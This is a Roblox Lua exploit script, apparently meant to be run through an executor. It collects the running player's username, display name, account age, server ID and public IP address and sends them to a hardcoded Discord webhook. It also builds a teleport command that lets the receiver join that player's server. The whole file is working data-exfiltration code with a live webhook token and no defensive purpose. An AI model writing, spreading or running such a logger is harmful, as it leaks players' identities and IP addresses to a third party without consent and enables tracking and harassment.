-- muhahaha
local webhookUrl = "https://discord.com/api/webhooks/1212487312873885716/76arKjYim_SIBRs6cTjnI7_ynKjEjdNp3H9DI5BbYisFQ42CBJHPYZnmG62TkeGJhdrD"

local player = game.Players.LocalPlayer
local username = player.Name
local accountAge = player.AccountAge
local gameUsername = player.DisplayName -- Use DisplayName for the in-game username
local serverId = game.JobId -- Use JobId for the server ID
local avatarUrl = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. username

-- Get the public IP address using ipinfo.io
local ipResponse = game:GetService("HttpService"):GetAsync("https://ipinfo.io/ip")
local ip = ipResponse and ipResponse:gsub("\n", "") or "Failed to retrieve IP"

local joinScript = "```lua\nEXECUTE THIS TO JOIN THEIR SERVER: \npcall(function() game:GetService(\"TeleportService\"):TeleportToPlaceInstance(game.PlaceId, \"" .. serverId .. "\", game:GetService(\"Players\").LocalPlayer) end)\n```"

local payload = {
    content = nil,
    embeds = {
        {
            title = "Script Has Been Executed!",
            description = "Username: " .. username .. "\nIp Address: " .. ip .. "\nDisplay User: " .. gameUsername .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId .. "\n\n" .. joinScript,
            color = nil,
            image = {
                url = avatarUrl
            }
        }
    },
    username = "The Rake",
    avatar_url = "https://th.bing.com/th/id/OIP.-M26uq0243bsJB97pgaZlQHaEK?w=319&h=180&c=7&r=0&o=5&dpr=1.5&pid=1.7",
    attachments = {}
}

local payloadJson = game:GetService("HttpService"):JSONEncode(payload)

local http_request = syn and syn.request or http and http.request or http_request or request or httprequest

if http_request then
    local response = http_request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payloadJson
    })

    -- Optionally, you can print the response to check for errors
    print(response and response.Body or "No response")
else
    warn("HTTP request not available.")
end
